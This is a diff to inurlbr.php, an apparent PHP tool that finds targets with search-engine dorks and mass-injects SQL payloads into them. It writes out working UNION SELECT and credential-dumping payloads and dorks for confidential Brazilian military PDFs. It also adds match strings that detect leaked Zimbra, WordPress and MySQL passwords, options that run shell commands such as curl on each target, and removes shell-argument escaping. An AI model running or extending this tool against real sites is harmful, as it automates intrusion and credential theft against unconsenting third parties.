@@ -15,13 +15,32 @@
 #php5-cli            LIB   
 #cURL support        enabled
 #cURL Information    7.24.0
-#Apache              2.4
 #allow_url_fopen     On
 #permission          Reading & Writing
 #User                root privilege, or is in the sudoers group
 #Operating system    LINUX
 #Proxy random        TOR                 
 ################################################################################
+/*
+ * [+] PERMISSION EXECUTION: chmod +x inurlbr.php
+ * [+] INSTALLING LIB CURL: sudo apt-get install php5-curl
+ * [+] INSTALLING LIB CLI: sudo apt-get install php5-cli
+ * [+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
+ * 
+ * -=[ - ] COMMANDS SIMPLE
+ * ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?'0x27"  
+ * ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+ * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+ * ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+ * ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+ * ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
+ * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+ * ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get "+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;" -a '::EXPLOIT-SUCESS::'
+ * 
+ * 
+ */
+
+//0x272D2D3B
 system("command clear");
 error_reporting(0);
 set_time_limit(0);
@@ -34,10 +53,12 @@ ini_set('allow_url_fopen', 1);
 servidorOS();
 
 //CAPTURANDO VALORES TERMINAL.
-$opcoes = (PHP_SAPI === 'cli') ? getopt('a:d:o:p:s:q:t:m::h', ['dork:', 'tor-random::', 'exploit-get:', 'exploit-post:', 'comand-all:', 'comand-vul:', 'help::', 'ajuda::']) : sair("MUST BE PERFORMED IN TERMINAL");
+$opcoes = (PHP_SAPI === 'cli') ? getopt('u::a:d:o:p:s:q:t:m::h', ['dork:', 'tor-random::', 'exploit-get:', 'exploit-post:', 'exploit-comand:', 'comand-all:', 'comand-vul:', 'replace:', 'help::', 'ajuda::']) : sair("MUST BE PERFORMED IN TERMINAL");
+
 
 //VERIFICANDO SE LIB php5-curl ESTÁ INSTALADA.
-(!extension_loaded("curl") ? sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mINSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install\033[0m\n") : NULL );
+(!function_exists('curl_exec') ? sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mINSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install\033[0m\n") : NULL );
+
 
 //IMPRIMINDO AJUDA.
 isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? menu() : NULL;
@@ -47,20 +68,26 @@ $_SESSION['config'] = array();
 $_SESSION["config"]["totas_urls"] = NULL;
 $_SESSION["config"]["contUrl"] = 0;
 $_SESSION["config"]['cont_email'] = 0;
+$_SESSION["config"]['cont_url'] = 0;
 ################################################################################################################################################################
 #CAPTURA DE OPÇÕES##############################################################
+
 if (isset($opcoes['o']) && !empty($opcoes['o'])) {
     $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
 } else {
     $_SESSION['config']['dork'] = isset($opcoes['dork']) && !empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE DORK ex: --dork '.asp?CategoryID='\033[0m\n\r");
 }
-$_SESSION['config']['extrai-email'] = isset($opcoes['m']) && empty($opcoes['o']) ? $opcoes['m'] : NULL;
+
+$_SESSION['config']['extrai-url'] = isset($opcoes['u']) && empty($opcoes['o']) ? true : NULL;
+$_SESSION['config']['extrai-email'] = isset($opcoes['m']) && empty($opcoes['o']) ? true : NULL;
 $_SESSION["config"]["motor"] = isset($opcoes['q']) && !empty($opcoes['q']) && validarOpcoes('1,2,3,4,5,6,7,8,9,10,11,12,13,all', $opcoes['q']) ? $opcoes['q'] : 1;
 $_SESSION['config']['arquivo_output'] = isset($opcoes['s']) && !empty($opcoes['s']) ? $opcoes['s'] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE FILE SAVE OUTPUT ex: -s filevull.txt\033[0m\n\r");
 $_SESSION['config']['tipoerro'] = isset($opcoes['t']) && !empty($opcoes['t']) && validarOpcoes('1,2,3', $opcoes['t']) ? $opcoes['t'] : 1;
+$_SESSION['config']['replace'] = isset($opcoes['replace']) && !empty($opcoes['replace']) ? $opcoes['replace'] : NULL;
 $_SESSION["config"]["proxy"] = isset($opcoes['p']) && !empty($opcoes['p']) ? $opcoes['p'] : NULL;
 $_SESSION['config']['exploit-get'] = isset($opcoes['exploit-get']) && !empty($opcoes['exploit-get']) ? $opcoes['exploit-get'] : NULL; //?--´'0x27"
 $_SESSION['config']['exploit-post'] = isset($opcoes['exploit-post']) && !empty($opcoes['exploit-post']) ? convertUrlQuery($opcoes['exploit-post']) : NULL;
+$_SESSION['config']['exploit-comand'] = isset($opcoes['exploit-comand']) && !empty($opcoes['exploit-comand']) ? $opcoes['exploit-comand'] : NULL; //?--´'0x27"
 $_SESSION['config']['comand-vul'] = isset($opcoes['comand-vul']) && !empty($opcoes['comand-vul']) ? $opcoes['comand-vul'] : NULL;
 $_SESSION['config']['comand-all'] = isset($opcoes['comand-all']) && !empty($opcoes['comand-all']) ? $opcoes['comand-all'] : NULL;
 $_SESSION['config']['achar'] = isset($opcoes['a']) && !empty($opcoes['a']) ? $opcoes['a'] : NULL;
@@ -68,25 +95,23 @@ $_SESSION['config']['debug'] = isset($opcoes['d']) && !empty($opcoes['d']) && va
 $_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;
 $_SESSION['config']['verifica_info'] = (validarOpcoes($opcoes['d'], 6)) ? 1 : NULL;
 
-
 ################################################################################################################################################################
 #MENU###########################################################################
 
 function menu() {
-    return system("command clear") . sair(extra() . "  
-  _    _ ______ _      _____  
- | |  | |  ____| |    |  __ \ 
- | |__| | |__  | |    | |__) |
- |  __  |  __| | |    |  ___/ 
- | |  | | |____| |____| |     
- |_|  |_|______|______|_|                       
+    return system("command clear") . sair(extra() . "        
+ _    _ ______ _      _____  
+| |  | |  ____| |    |  __ \
+| |__| | |__  | |    | |__) |
+|  __  |  __| | |    |  ___/
+| |  | | |____| |____| |    
+|_|  |_|______|______|_|                      
 ----------------------------------------------------------------------------------------------------------------------------------
-
- -h      Ajuda
---help   Ajuda
---ajuda  Ajuda
- -q  Define motor de busca 1,2,3,4,5,6,7,8,9,10,11,12,13,all cada número é referente um motor.
-     [opções]:
+-h
+--help   Alternative long length help command.
+--ajuda  Command to specify Help.
+ -q  Choose which search engine you want through [1...13]:
+     [options]:
      1   - www.google.com.br
      2   - www.bing.com
      3   - br.search.yahoo.com
@@ -99,96 +124,119 @@ function menu() {
      10  - pesquisa.sapo.pt
      11  - www.dmoz.org
      12  - www.gigablast.com
-     all - todos motores de busca
+     13  - web.search.naver.com
+     all - All search engines
      Default:    1
-     Exemplo: -q {op}
-     Uso:     -q 1
+     Example: -q {op}
+     Usage:   -q 1
               -q 5
-               Múltiplos motores  -q 1,2,5,6,11
-               Todos motores      -q all
+               Using more than one engine:  -q 1,2,5,6,11
+               Using all engines:      -q all
      
- -p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
-     Exemplo: -p {proxy:porta}
-     Uso:     -p localhost:8118
+ -p  Choose which proxy you want to use through the search engine:
+     Example: -p {proxy:port}
+     Usage:   -p localhost:8118
               -p socks5://googleinurl@localhost:9050
               -p http://admin:12334@172.16.0.90:8080
    
---tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.
-
- -t  Define que tipo de validação o script vai efetuar op 1,2,3
-     [opções]:
-     1   - Tipo 1 valida erros padrões do script
-     injeta & concatena exploit apartir do host & gets.
-     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
-   
-     2   -  Tipo 2 valida o erro definido na opção -a='ALGO_DENTRO_ALVO'
-     injeta & concatena exploit apartir do host & gets.
-     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
-    
-     3   - Tipo 3 valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
-     injeta & concatena exploit apartir do host.
-     demonstrativo: www.alvo.com.br{exploit}
-     Default:    1
-     Exemplo: -t {op}
-     Uso:     -t 1
-     
-     ERRO PADRÃO SCRIPT:  
-     ERRO MYSQL,ERRO MICROSOFT,ERRO ORACLE,ERRO POSTGRESQL,
-     ZEND FRAMEWORK,ERRO PHP,ERRO ASP,ERRO LUA,ERRO INDEFINIDOS
-   
- --dork Define a dork que vai ser buscada nos motores.
-     Exemplo: --dork {dork}
-     Uso:     --dork 'site:.gov.br inurl:php? id'
-     - Usando múltiplas dorks.
-     Exemplo: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
-     Uso:     --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
-
- --exploit-get  Define exploit via get será injetado a cada URL encontrada.
-     Exemplo: --exploit-get {exploit_get}
-     Uso:     --exploit-get '?´0x27;'
-     
- --exploit-post Define exploit via post será injetado a cada URL encontrada. 
-     Exemplo: --exploit-post {exploit_post}
-     Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
-     
- -a  Define procurar string que será procurada dentro de cada URL encontrada. 
-     Exemplo: -a {string_procurada}
-     Uso:     -a '<title>ola mundo</title>'
-     
- -d  Define o nível de debug na execução do script op 1,2,3,4,5,6
-     Exemplo: -d {op}
-     Uso:     -d 1 /URL motor de busca.
-              -d 2 /Mostra toda url executada. 
-              -d 3 /Request detalhada de cada URL encontrada.
-              -d 4 /Mostra html de cada url executada.
-              -d 5 /Request detalhada de todas urls.
-              
- -s  Define arquivo de saida onde vai ser salvadas as URLS vulneráveis.
-     Exemplo: -s {arquivo}
-     Uso:     -s seu_arquivo.txt
-     
- -o  Define arquivo que vai possibilitar execucação de testes com base em arquivo,
-     Sem motor de busca.
-     Exemplo: -o {arquivo_minhas_urls}
-     Uso:     -o testes.txt
+--tor-random Enables the TOR function, each usage links an unique IP.
  
--m  Habilita buscar lista de emais dentro das urls encontrdas.  
-
- --comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
-     Exemplo: --comand-vul {comando}
-     Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
-              --comand-vul './exploit.sh _TARGET_ output.txt'
-              
- --comand-all Executa comandos no terminal para todas URLS encontradas.
-     Exemplo: --comand-all {comando}
-     Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
-              --comand-all './exploit.sh _TARGET_ output.txt'
-              
-    Observação: 
-    _TARGET_ será substituído por pelo URL/alvo encontrado, porem formatado sem 
-    os gets & pastas será executado somente o domínio.
-   _TARGETFULL_ será substituído por pelo URL/alvo encontrado será mantido a URL/alvo original encontrada. 
+ -t  Choose the validation type: op 1, 2, 3
+     [options]:
+     1   - The first type uses default errors considering the script:
+     It establishes connection with the exploit through the get method.
+     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
    
+     2   -  The second type tries to valid the error defined by: -a='ALGO_DENTRO_ALVO'
+     It also establishes connection with the exploit through the get method
+     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
+   
+     3   - The third type combine both first and second types:
+     Then, of course, it also establishes connection with the exploit through the get method
+     Demo: www.alvo.com.br{exploit}
+     Default:    1
+     Example: -t {op}
+     Usage:   -t 1
+     
+     DEFAULT ERRORS:  
+     CMS WORDPRESS, JDBC ERROR, MYSQL ERROR, MICROSOFT ERROR, ORACLE ERROR, POSTGRESQL ERROR,
+     ZEND FRAMEWORK ERROR, PHP ERROR, ASP ERROR, LUA ERROR, INDEFINITE ERROR
+   
+ --dork Defines which dork the search engine will use.
+     Example: --dork {dork}
+     Usage:   --dork 'site:.gov.br inurl:php? id'
+     - Using multiples dorks:
+     Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
+     Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
+ 
+ --exploit-get Defines which exploit will be injected through the GET method to each URL found.
+     Example: --exploit-get {exploit_get}
+     Usage:   --exploit-get '?´0x27;'
+     
+ --exploit-post Defines which exploit will be injected through the POST method to each URL found.
+     Example: --exploit-post {exploit_post}
+     Usage:   --exploit-post 'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'
+     
+ --exploit-comand Defines which exploit/parameter will be executed in the options: --comand-vul/--comand-all.  
+     The exploit-comand will be identified by the paramaters: --comand-vul/--comand-all como _EXPLOIT_        
+     Ex --exploit-comand '/admin/config.conf' --comand-all 'curl -v _TARGET__EXPLOIT_'
+     _TARGET_ is the specified URL/TARGET obtained by the process
+     _EXPLOIT_ is the exploit/parameter defined by the option --exploit-comand.
+     Example: --exploit-comand {exploit-comand}
+     Usage:   --exploit-comand '/admin/config.conf'    
+     
+ -a  Specify the string that will be used on the search script:
+     Example: -a {string}
+     Usage:   -a '<title>hello world</title>'
+     
+ -d  Specify the script usage op 1, 2, 3, 4, 5, 6.
+     Example: -d {op}
+     Usage:     -d 1 /URL of the search engine.
+              -d 2 /Show all the url.
+              -d 3 /Detailed request of every URL.
+              -d 4 /Shows the HTML of every URL.
+              -d 5 /Detailed request of all URLs.
+             
+ -s  Specify the output file where it will be saved the vulnerable URLs.
+     
+     Example: -s {file}
+     Usage:   -s your_file.txt
+     
+ -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
+     Example: -o {file_where_my_urls_are}
+     Usage:   -o tests.txt
+ 
+ -m  Enable the search for emails on the urls specified.
+       
+ -u  Enables the search for URL lists on the url specified.
+ 
+ --comand-vul Every vulnerable URL found will execute this command parameters.
+     Example: --comand-vul {command}
+     Usage:   --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
+              --comand-vul './exploit.sh _TARGET_ output.txt'
+             
+ --comand-all Use this commmand to specify a single command to EVERY URL found.
+     Example: --comand-all {command}
+     Usage:   --comand-all 'nmap sV -p 22,80,21 _TARGET_'
+              --comand-all './exploit.sh _TARGET_ output.txt'
+             
+    Observation:
+   
+    _TARGET_ will be replaced by the URL/target found, although if the user  
+    doesn't input the get, only the domain will be executed.
+   
+   _TARGETFULL_ will be replaced by the original URL / target found.
+   
+   _EXPLOIT_  will be replaced by the specified command argument --exploit-comand.
+   The exploit-comand will be identified by the parameters --comand-vul / --comand-all as _EXPLOIT_
+
+ --replace Replace values ​​in the target URL.
+    Example:  --replace {value_old[INURL]value_new}
+     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
+              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
+              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
+
+
 ");
 }
 
@@ -212,6 +260,17 @@ function bannerLogo() {
 \033[1;37m0x\033[0m\033[02;31mHelp: php inurlbr.php --help\033[0m\r
 \033[1;37m0x----------------------------------------------------------------------------------------------------------------------------------\033[0m\r
 \r";
+}
+
+################################################################################################################################################################
+#SUBUSTITUIR VALORES NA URL#####################################################
+
+function replace($exploit, $url) {
+    $exploit = strstr($_SESSION["config"]['replace'], '[INURL]') ? $exploit : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
+    $exploit = explode("[INURL]", $exploit);
+    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ? $exploit[0] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
+    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ? $exploit[1] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
+    return str_replace($exploit[0], $exploit[1], $url);
 }
 
 ################################################################################################################################################################
@@ -307,13 +366,25 @@ function validaEmail($email) {
     return (ereg($pattern, $email)) ? TRUE : FALSE;
 }
 
+function validaUrl($url) {
+
+    if (preg_match("#\b((((ht|f)tps?://)|(www|ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i", $url)) {
+        return TRUE;
+    } else {
+        return FALSE;
+    }
+}
+
 ################################################################################################################################################################
 #Esta função irá filtrar emails de cada url ####################################
 
-function extrairMail($html) {
+function extrairMail($html, $url_) {
     $matches = NULL;
     plus();
     preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
+    echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
+    echo "\033[1;37m0x0xURL => {$url_} \033[0m\r\n";
+    echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
     $matches_ = array_unique(array_unique($matches[0]));
     foreach ($matches_ as $valor) {
         if (validaEmail($valor)) {
@@ -322,6 +393,29 @@ function extrairMail($html) {
             plus();
             salvarTXT($_SESSION["config"]["arquivo_output"], $valor);
             $_SESSION["config"]["cont_email"] ++;
+        }
+        plus();
+    }
+}
+
+################################################################################################################################################################
+#Esta função irá filtrar urls de cada url ######################################
+
+function extrairURLs($html, $url_) {
+    $matches = NULL;
+    plus();
+    preg_match_all('#\b((((ht|f)tps?://)|(www|ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i', $html, $matches);
+    echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
+    echo "\033[1;37m0x0xURL => {$url_} \033[0m\r\n";
+    echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
+    $matches_ = array_unique(array_unique($matches[0]));
+    foreach ($matches_ as $valor) {
+        if (validaUrl($valor)) {
+            echo "\033[1;37m0x\033[0m[\033[01;31m {$_SESSION["config"]['cont_url']} \033[0m]- {$valor}\r\n";
+            $_SESSION["config"]["totas_urls"].="{$valor}\n";
+            plus();
+            salvarTXT($_SESSION["config"]["arquivo_output"], $valor);
+            $_SESSION["config"]["cont_url"] ++;
         }
         plus();
     }
@@ -417,12 +511,13 @@ function comando($comando, $alvo) {
     if (!is_null($comando)) {
         (strstr($comando, '_TARGET_') || strstr($comando, '_TARGETFULL_') ? NULL : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mSET PARAMETER - comand correctly\033[0m\n"));
         if (strstr($comando, '_TARGET_')) {
-            $alvo = parse_url($alvo);
-            $alvo_ = (isset($alvo['host'])) ? $alvo['host'] : $alvo['path'];
-            $comando = str_replace('_TARGET_', escapeshellarg($alvo_), $comando);
+
+            $comando = str_replace("_TARGET_", filtroHostname($alvo), $comando);
+            $comando = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-comand'], $comando);
         } else {
 
-            $comando = str_replace('_TARGETFULL_', escapeshellarg($alvo), $comando);
+            $comando = str_replace('_TARGETFULL_', $alvo, $comando);
+            $comando = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-comand'], $comando);
         }
 
         echo "\n\033[1;34m[*]__\033[0m\n";
@@ -436,6 +531,12 @@ function comando($comando, $alvo) {
         return FALSE;
     }
     unset($dados);
+}
+
+function filtroHostname($url) {
+    $alvo_ = null;
+    preg_match_all("#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9\.]+)#i", $url, $alvo_);
+    return str_replace("/", '', str_replace("ftps:", '', str_replace("ftp:", '', str_replace("https:", '', str_replace("http:", '', $alvo_[0][0])))));
 }
 
 ################################################################################################################################################################
@@ -493,9 +594,13 @@ function infoServer($url_, $postDados = NULL) {
     $_SESSION['config']['verifica_info'] = 1;
     $resultado = request_info($curl = curl_init(), $url_, $_SESSION["config"]["proxy"], $postDados);
     if (isset($resultado['corpo'])) {
-        if (isset($_SESSION['config']['extrai-email'])) {
+        if ($_SESSION['config']['extrai-email'] == TRUE) {
             plus();
-            return extrairMail($resultado['corpo']);
+            return extrairMail($resultado['corpo'], $url_);
+        }
+        if ($_SESSION['config']['extrai-url'] == TRUE) {
+            plus();
+            return extrairURLs($resultado['corpo'], $url_);
         }
         $_SESSION['config']['erroReturn'] = verificaErro($resultado['corpo']);
         $_SESSION['config']['vull_style'] = (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "\033[1;37m0x0x0x\033[0;32m::[0xTARGET 0xPOTENTIALLY 0xVULNERABLE]=>  \033[42;30m" : NULL;
@@ -513,10 +618,11 @@ function infoServer($url_, $postDados = NULL) {
 
 function processoUrlExec($url, $contUrl) {
     plus();
-    $host = $_SESSION['config']['tipoerro'] == '3' ? parse_url($url) : ($url);
-    $info = infoserver(gerarErroDB(isset($host['host']) ? $host['host'] : $url), $_SESSION['config']['exploit-post']);
-    if (!isset($_SESSION['config']['extrai-email'])) {
-        $url_ = isset($host['host']) ? $host['host'] : urldecode($url);
+    $host = urldecode($_SESSION['config']['tipoerro'] == '3' ? filtroHostname($url) : ($url));
+    $host = replace($_SESSION['config']['replace'], $host);
+    $info = infoserver(gerarErroDB($host), $_SESSION['config']['exploit-post']);
+    if (is_null($_SESSION['config']['extrai-email']) && is_null($_SESSION['config']['extrai-url'])) {
+        $url_ = urldecode($url);
         $exget = (!is_null($_SESSION['config']['exploit-get']) && !empty($_SESSION['config']['exploit-get']) ? ' GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
         $expost = (!is_null($_SESSION['config']['exploit-post']) && !empty($_SESSION['config']['exploit-post']) ? ' POST=> ' . $_SESSION['config']['exploit-post'] : NULL);
         $info = (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "\033[0;32m{$info}" : $info;
@@ -568,6 +674,26 @@ function verificaErro($html_) {
 
     if (validarOpcoes($_SESSION['config']['tipoerro'], 1) || validarOpcoes($_SESSION['config']['tipoerro'], 3)) {
 
+
+        #JAVA INFINITYDB
+        $erro['JAVA-INFINITYDB-01'] = 'java.io.IOException: InfinityDB';
+
+        #LOCAL FILE INCLUSION
+        $erro['LOCAL-FILE-INCLUSION-01'] = '/root:/';
+
+        #ZIMBRA MAIL
+        $erro['ZIMBRA-WEB-MAIL-01'] = 'zimbra_user';
+        $erro['ZIMBRA-WEB-MAIL-02'] = 'zimbra_ldap_password';
+        $erro['ZIMBRA-WEB-MAIL-03'] = 'ldap_replication_password';
+        $erro['ZIMBRA-WEB-MAIL-04'] = 'ldap_root_password';
+        $erro['ZIMBRA-WEB-MAIL-05'] = 'ldap_nginx_password';
+        $erro['ZIMBRA-WEB-MAIL-06'] = 'mailboxd_keystore_password';
+        $erro['ZIMBRA-WEB-MAIL-07'] = 'zimbra_mysql_password';
+        $erro['ZIMBRA-WEB-MAIL-08'] = 'mysql_root_password';
+        $erro['ZIMBRA-WEB-MAIL-10'] = 'mailboxd_truststore_password';
+        $erro['ZIMBRA-WEB-MAIL-11'] = 'ldap_postfix_password';
+        $erro['ZIMBRA-WEB-MAIL-12'] = 'ldap_amavis_password';
+
         #ZEND FRAMEWORK
         $erro['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
         $erro['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
@@ -575,9 +701,18 @@ function verificaErro($html_) {
         $erro['ZEND-FRAMEWORK-04'] = 'db.params.password';
         $erro['ZEND-FRAMEWORK-05'] = 'db.params.dbname';
 
+        #CMS WORDPRESS
+        $erro['CMS-WORDPRESS-01'] = "define('DB_NAME'";
+        $erro['CMS-WORDPRESS-02'] = "define('DB_USER'";
+        $erro['CMS-WORDPRESS-03'] = "define('DB_PASSWORD'";
+        $erro['CMS-WORDPRESS-04'] = "define('DB_HOST'";
+
+        #ERROS MARIADB
+        $erro['MARIADB-01'] = 'MariaDB server version for the right syntax';
+
         #ERROS MYSQL
         $erro['MYSQL-01'] = 'mysql_';
-        $erro['MYSQL-02'] = 'You have an error in your SQL syntax;';
+        $erro['MYSQL-AND-MARIADB'] = 'You have an error in your SQL syntax;';
         $erro['MYSQL-03'] = 'Warning: mysql_';
         $erro['MYSQL-04'] = 'function.mysql';
         $erro['MYSQL-05'] = 'MySQL result index';
@@ -585,6 +720,7 @@ function verificaErro($html_) {
         $erro['MYSQL-07'] = 'MySQL';
         $erro['MYSQL-08'] = 'mysqli.query';
         $erro['MYSQL-09'] = 'num_rows';
+        $erro['MYSQL-10'] = 'mysql error:';
 
         #ERROS MICROSOFT
         $erro['MICROSOFT-01'] = 'Microsoft JET Database';
@@ -701,7 +837,7 @@ function subProcesso($resultado, $motorNome) {
             $blacklist = "google.,uol.,youtube.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,";
             $blacklist.= "live.,microsoft.,ask.,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,dmoz.,gigablast.,aol.,";
             $blacklist.="aolcdn.,altavista.,clusty.,teoma.,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,";
-            $blacklist.="4shared.,stackoverflow.,gstatic.,php.net,wikipedia.,webcache.";
+            $blacklist.="4shared.,stackoverflow.,gstatic.,php.net,wikipedia.,webcache.,inurl.";
             $url = ($motorNome == 'ajax.googleapis.com') ? $result["url"] : $result;
             if (!is_null($url) && !empty($url) && !validarOpcoes($blacklist, $url, 1)) {
                 $_SESSION["config"]["totas_urls"].="[URL]{$url}";
@@ -726,7 +862,9 @@ echo "\033[1;37m0x\033[0m\033[02;31m::SEARCHING::\033[1;37m{\033[0m ";
 
 plus();
 $dork = (isset($dork)) ? $dork : sair("DEFINA SUA DORK");
-
+$opMenu = $_SESSION["config"];
+unset($opMenu["config"]["cod"]);
+print_r($opMenu["config"]);
 ################################################################################
 #MOTOR DE BUSCA google
 ################################################################################
@@ -937,19 +1075,40 @@ if (validarOpcoes($_SESSION["config"]["motor"], 12) || validarOpcoes($_SESSION["
     plus();
 }
 
+################################################################################
+#MOTOR DE BUSCA web.search.naver.com
+################################################################################
+if (validarOpcoes($_SESSION["config"]["motor"], 13) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
+    plus();
+    $motorNome = "web.search.naver.com";
+    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
+
+    for ($pag = 1; $pag <= 1000; $pag = $pag = $pag+10) {
+        echo "\033[1;37m0x\033[0m[####]";
+        plus();
+        $url_motor = "http://web.search.naver.com/search.naver?where=webkr&query={$dork}&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start={$pag}";
+        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
+        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
+        plus();
+    }
+}
+
 plus(); ';
 
 ################################################################################################################################################################
 #EXECUTAR BUSCA COM MOTORES#####################################################
 
 function main($dork, $motor, $cod) {
+
     $dork = ((strstr($dork, '[DORK]'))) ? explode('[DORK]', $dork) : array($dork); // MULTIPLAS DORKS
     echo bannerLogo();
+
     for ($i = 0; $i <= count($dork); $i++) {
         if (!empty($dork[$i])) {
             echo "\r\n\033[1;37m0x\033[0m\033[02;31mDORK::\033[1;37m{ {$dork[$i]}  }\r\n";
             $objNovaBusca = create_function('$dork, $motor', $cod);
             $objNovaBusca(urlencode($dork[$i]), $motor);
+            plus();
             echo "\n\r";
         }
     }
@@ -1002,16 +1161,6 @@ Y888888P VP   V8P ~Y8888P' 88   YD Y88888P Y8888P' 88   YD
  | ||  \| | | | | |_) | |   |  _ \| |_) |
  | || |\  | |_| |  _ <| |___| |_) |  _ < 
 |___|_| \_|\___/|_| \_\_____|____/|_| \_\
-", "
- _  _  _           _           _        _            _       _  _  _  _           _                    _  _  _  _           _  _  _  _       
-(_)(_)(_)         (_) _       (_)      (_)          (_)     (_)(_)(_)(_) _       (_)                  (_)(_)(_)(_) _       (_)(_)(_)(_) _    
-   (_)            (_)(_)_     (_)      (_)          (_)     (_)         (_)      (_)                   (_)        (_)      (_)         (_)   
-   (_)            (_)  (_)_   (_)      (_)          (_)     (_) _  _  _ (_)      (_)                   (_) _  _  _(_)      (_) _  _  _ (_)   
-   (_)            (_)    (_)_ (_)      (_)          (_)     (_)(_)(_)(_)         (_)                   (_)(_)(_)(_)_       (_)(_)(_)(_)      
-   (_)            (_)      (_)(_)      (_)          (_)     (_)   (_) _          (_)                   (_)        (_)      (_)   (_) _       
- _ (_) _          (_)         (_)      (_)_  _  _  _(_)     (_)      (_) _       (_) _  _  _  _        (_)_  _  _ (_)      (_)      (_) _    
